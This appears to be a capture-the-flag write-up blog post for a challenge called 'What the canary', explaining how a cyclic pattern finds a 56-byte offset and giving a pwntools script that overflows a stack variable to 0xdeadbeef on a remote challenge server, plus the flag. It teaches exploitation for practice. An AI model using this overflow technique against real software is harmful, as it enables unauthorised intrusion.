+++
title = 'What the canary'
date = '2024-09-05'
authors = ["Achintya J"]
+++



This provides us with a binary and the source code for a vulnerable program (hence the name vuln, duh). Now we'll open the file using `gdb`, note that I am using `gdb-peda`and you might be using something else, so adapt accordingly

		gdb -q ./vuln
		checksec

running `checksec` we can see that even though the challenge talks about canaries, there aren't any canaries! If we run the program (just type `r`) we can see that it expects us to enter something.

Entering a random string we get this sort of a message,

		code == 0x0
		code != 0xdeadbeef :(
		Well, that was unexpected...

Well that means, we want the code to be `0xdeadbeef`. The first thing we'll need to do is find out what offset overwrites this value. So, head over to [this](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html) link to generate a random string.

Entering the 100 byte string: "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A", we get this

		code == 0x4130634139624138
		code != 0xdeadbeef :(
		Well, that was unexpected...

So, we've written something... what is that? If we convert that from hex, we can see that its "A0cA9bA8". This string is not present anywhere in our input! However, its reverse "8Ab9Ac0A" is at the `56th` offset. 

What this means is, if we enter 56 bytes, then the next 8 bytes will overwrite this address. This simple script can therefore be used to achieve the flag.

		from pwn import *
		context.binary = binary = ELF("./vuln")
		context.log_level = "critical"
		payload = flat([
			b"A"*56,
			p32(0xdeadbeef) # simply enter the exact address, it will handle the endianess in its default values
			])
		p = remote('10.21.232.38', 7001)
		p.sendline(payload)
		p.interactive()


flag: `iitmCTF{N0-C@n@r!35-r3Qu!r3|)}`
